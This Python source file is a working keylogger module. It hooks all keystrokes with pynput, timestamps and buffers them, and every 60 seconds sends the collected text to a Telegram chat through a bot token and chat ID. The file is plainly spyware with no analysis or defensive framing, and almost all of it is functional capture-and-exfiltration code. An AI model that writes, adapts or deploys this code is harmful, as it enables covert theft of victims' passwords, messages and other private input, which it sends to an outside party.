import asyncio
from pynput import keyboard
import threading
import time
from datetime import datetime
import logging # Import logging

logger = logging.getLogger(__name__) # Get logger

# Buffer to hold keystrokes before sending
key_buffer = []
buffer_lock = threading.Lock()

# --- Keystroke Handling ---

def format_key(key):
    """Formats the captured key for readability."""
    try:
        # Regular character key
        return key.char
    except AttributeError:
        # Special key (e.g., Key.space, Key.ctrl_l)
        key_name = str(key).replace("Key.", "")
        # Add special formatting for better readability
        if key_name in ["space", "enter", "tab"]:
            return f"[{key_name.upper()}]"
        elif "shift" in key_name:
            return "[SHIFT]"
        elif "ctrl" in key_name:
            return "[CTRL]"
        elif "alt" in key_name:
            return "[ALT]"
        elif "cmd" in key_name or "win" in key_name: # Handle Mac Command / Windows key
             return "[SUPER]"
        elif key_name == "backspace":
             return "[BACKSPACE]"
        elif key_name == "delete":
             return "[DELETE]"
        # You can add more specific formatting for other keys (F-keys, arrows, etc.) if needed
        else:
            return f"[{key_name}]" # Generic representation for other special keys

def on_press(key):
    """Callback function when a key is pressed."""
    formatted_key = format_key(key)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp} - {formatted_key}"

    with buffer_lock:
        key_buffer.append(log_entry)
        # print(f"Logged: {log_entry}") # Optional: print locally for debugging

def on_release(key):
    """Callback function when a key is released."""
    # We could log releases too, or check for modifier key releases,
    # but for basic keylogging, on_press is usually sufficient.
    # Example: Stop condition (though usually we run indefinitely)
    # if key == keyboard.Key.esc:
    #     # Stop listener
    #     return False
    pass

# --- Listener Control ---

listener_thread = None
stop_event = threading.Event()

def start_keyboard_listener():
    """Starts the keyboard listener in a separate thread."""
    global listener_thread
    if listener_thread is None or not listener_thread.is_alive():
        logger.info("Starting keyboard listener...")
        print("Starting keyboard listener...") # Keep print
        stop_event.clear()
        try:
            # Create and start the listener
            listener = keyboard.Listener(on_press=on_press, on_release=on_release, suppress=False) # suppress=False might be needed depending on env
            # Run the listener in a daemon thread so it exits when the main program exits
            listener_thread = threading.Thread(target=listener.start, daemon=True)
            listener_thread.start()
            logger.info("Keyboard listener started.")
            print("Keyboard listener started.")
        except Exception as e:
            logger.critical(f"Failed to start keyboard listener: {e}", exc_info=True)
            print(f"CRITICAL ERROR: Failed to start keyboard listener: {e}")
            # Optionally exit or notify
    else:
        logger.warning("Keyboard listener already running.")
        print("Keyboard listener already running.")


def stop_keyboard_listener():
    """Signals the keyboard listener thread to stop."""
    global listener_thread
    if listener_thread and listener_thread.is_alive():
        print("Stopping keyboard listener...")
        # Pynput listeners don't have a direct external stop method in the same way
        # threading.Event works. We need to call listener.stop() from within its thread,
        # often triggered by a specific key (like Esc in on_release) or another signal.
        # Forcing stop from outside is tricky. For this setup, we rely on it being a daemon thread
        # that exits with the main app, or we implement a mechanism within on_press/on_release.
        # Alternatively, we could manage the listener object more directly.
        # For now, we'll rely on the daemon nature or manual stop (Ctrl+C).
        # A more robust stop might involve a shared flag checked periodically or using listener.stop().
        # stop_event.set() # This event isn't directly used by pynput listener.stop()
        print("Keyboard listener stop signaled (daemon thread will exit with app).")
    else:
        print("Keyboard listener not running.")


async def key_sender(send_func, bot_token, chat_id, interval=60):
    """Periodically sends the buffered keystrokes using the provided send function."""
    global key_buffer
    while True:
        await asyncio.sleep(interval)
        logger.debug(f"Checking key buffer (interval: {interval}s)...") # Debug level
        # print(f"Checking key buffer (interval: {interval}s)...")
        temp_buffer = []
        with buffer_lock:
            if key_buffer:
                logger.debug(f"Found {len(key_buffer)} keys in buffer. Preparing to send.")
                # print(f"Found {len(key_buffer)} keys in buffer. Preparing to send.")
                # Swap buffers quickly
                temp_buffer = key_buffer
                key_buffer = []
            # else:
                # logger.debug("Key buffer is empty.") # Too noisy maybe
                # print("Key buffer is empty.")

        if temp_buffer:
            log_data = "\n".join(temp_buffer)
            max_len = 4000
            if len(log_data) > max_len:
                 log_data = log_data[:max_len] + "\n... [TRUNCATED]"
                 logger.warning("Keystroke log data truncated due to length limit.")
            logger.info(f"Sending {len(temp_buffer)} keystrokes to Telegram.")
            # print(f"Sending {len(temp_buffer)} keystrokes to Telegram.")
            try:
                # Use create_task to avoid blocking the sender loop if sending takes time
                asyncio.create_task(send_func(bot_token, chat_id, f"Keystrokes Logged:\n```\n{log_data}\n```"))
                logger.debug("Task created for sending keystrokes.")
            except Exception as e:
                logger.error(f"Failed to create task for sending keystrokes to Telegram: {e}", exc_info=True)
                # Consider adding keys back to buffer or saving locally
                # with buffer_lock:
                #    key_buffer = temp_buffer + key_buffer # Prepend to resend first

# --- Main entry point for testing this module (optional) ---
if __name__ == '__main__':
    print("Starting keylogger module test...")
    start_keyboard_listener()
    try:
        # Keep the main thread alive to allow the listener thread to run
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping keylogger module test.")
        stop_keyboard_listener()
        # Wait for the listener thread to finish if it wasn't a daemon or if explicit joining is needed
        # if listener_thread and listener_thread.is_alive():
        #    listener_thread.join()
        print("Keylogger module test finished.") 